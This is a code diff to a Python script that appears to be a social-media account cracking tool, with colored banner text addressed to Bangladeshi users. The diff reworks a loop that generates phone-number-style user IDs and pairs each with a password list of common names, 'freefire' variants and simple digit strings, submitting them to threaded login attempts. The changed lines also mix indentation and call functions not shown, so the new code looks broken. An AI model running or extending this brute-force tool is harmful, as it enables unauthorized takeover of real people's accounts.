@@ -243,13 +243,10 @@ def umo_in():
         print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;94m WORK CUNTRY \033[1;97m: \033[1;96mBANGLADESH')
         print(f' \033[1;91m[\033[1;97m•\033[1;91m]\033[1;91m USE AEROPLANE MOOD IN EVERY 5 MIN ')
         shoha()
-        for love in user:
-            pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','Bangladesh','BANGLADESH','freefire','free fire123','FREE FIRE','FREE FIRE123','free fire','i love you','nusrat','jannat','sadiya','Farjana','Sultana','fatema','soniya','tamanna','nadiya','102030','100200','12345678','Faruk123','maruf123','57273200',]
-            uid = kode+koda+kodb+guru
-            for Eman in HamiiID:
-                pwx.append(Eman)
-                pwx.append(love)
-            manshera.submit(rcrack,uid,pwx,tl)
+        for guru in user:
+			uid = kode+koda+kodb+guru
+			pwx = [koda+kodb+guru,kodb+guru,kode+koda+kodb,kode+kode,kode+'123',kode+'1234','Bangladesh','BANGLADESH','freefire','free fire123','FREE FIRE','FREE FIRE123','free fire','i love you','nusrat','jannat','sadiya','Farjana','Sultana','fatema','soniya','tamanna','nadiya','102030','100200','12345678','Faruk123','maruf123','57273200',]
+			yaari.submit(b,uid,pwx,tl)
     shoha()
 def rcrack(uid,pwx,tl):
     #print(user)
